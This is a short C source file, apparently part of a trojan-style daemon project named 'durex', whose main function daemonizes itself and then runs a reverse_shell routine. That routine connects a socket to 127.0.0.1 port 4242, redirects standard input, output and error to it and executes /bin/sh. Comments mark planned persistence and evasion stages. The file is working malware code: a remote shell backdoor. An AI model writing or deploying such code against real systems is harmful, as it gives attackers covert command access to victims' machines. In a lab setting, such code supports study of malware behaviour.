#include "durex.h"

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4242

void    reverse_shell(void)
{
    int sock;
    struct sockaddr_in sa;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *sdf[] = {NULL};
    execv("/bin/sh", sdf);
    return ;
}

int     main(void)
{

    create_daemon_old_style();

    reverse_shell();
    return (0);
    // debug
    syslog (LOG_NOTICE, "Daemon started");

    // persistance

    closelog();
    // evasion

    // remote access

    int i = 0;
    while (true)
    {
        if (i == 6)
            break ;
        sleep(10);
        i++;
    }
    syslog (LOG_NOTICE, "Daemon stoped");
    return (0);
}
